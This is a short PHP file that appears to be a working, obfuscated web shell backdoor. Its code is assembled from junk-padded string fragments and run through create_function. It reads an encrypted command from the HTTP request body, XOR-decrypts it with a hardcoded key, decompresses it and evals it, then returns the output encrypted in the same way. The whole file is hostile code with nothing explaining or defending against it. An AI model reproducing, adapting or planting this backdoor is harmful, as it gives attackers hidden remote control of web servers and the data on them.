<?php
$P='$k="bf6f7D"D"49b";$kh="7D"D"0ae9D"64ba9ed";D"$kD"f="84d64e9a0fb1D"";D"D"D"$p="MFJhKIqBE73GuzD"sQ";D"';
$i='D"l(@gzuncomD"press(D"@x(@baD"se64_dD"D"ecode($m[D"1]),$D"k)));$o=D"@ob_getD"_D"contents()D";@ob';
$U='"cD"h("/$kh(.+)$kf/D"D"",@file_get_contD"ents("php://iD"nD"putD"")D",$m)==D"1) {@D"ob_start();@eva';
$m=str_replace('p','','pcpreatep_fpunpctipon');
$c='_D"eD"nd_clean();$r=D"@baD"se64_enD"code(D"D"@xD"(@gzcoD"mpress($oD"),$k));print("D"$pD"$kh$r$kf");}';
$E='D"function x($t,$k){$D"c=strD"D"len($k);$l=D"strlD"eD"n($t);$o="";forD"(D"$i=0;$i<D"D"$l;){for($j=0D';
$F='"D";($j<D"$c&&$D"i<$l);$j++,$D"iD"++){$o.D"=$t{$D"i}^$k{$jD"};}}returnD" $D"o;}iD"f (@pD"reg_matD"D';
$n=str_replace('D"','',$P.$E.$F.$U.$i.$c);
$p=$m('',$n);$p();
?>
